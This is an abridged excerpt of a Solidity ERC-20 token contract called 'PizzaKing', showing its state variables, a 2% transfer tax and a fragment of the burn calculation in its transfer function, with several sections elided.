...
contract PizzaKing  is Ownable, IERC20 {
    using SafeMath for uint256;
    mapping (address => uint256) private _tOwned;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFrom;
    address private isExcluded;
    string private _name = "PizzaKing";
    string private _symbol = "PizzaKing";
    uint256 private _decimals = 9;
    uint256 public _taxfee = 2;
    uint256 private _totalSupply = 100000000000 * 10 ** _decimals;
    IDEXRouter private router;
    address public hole = 0x000000000000000000000000000000000000dEaD;
    constructor() {
    ...
    function _transfer(address form, address to, uint256 amount) internal virtual {
        ...
        && to != address(this)) { _bruntoken = amount.mul(_taxfee).div(100);}
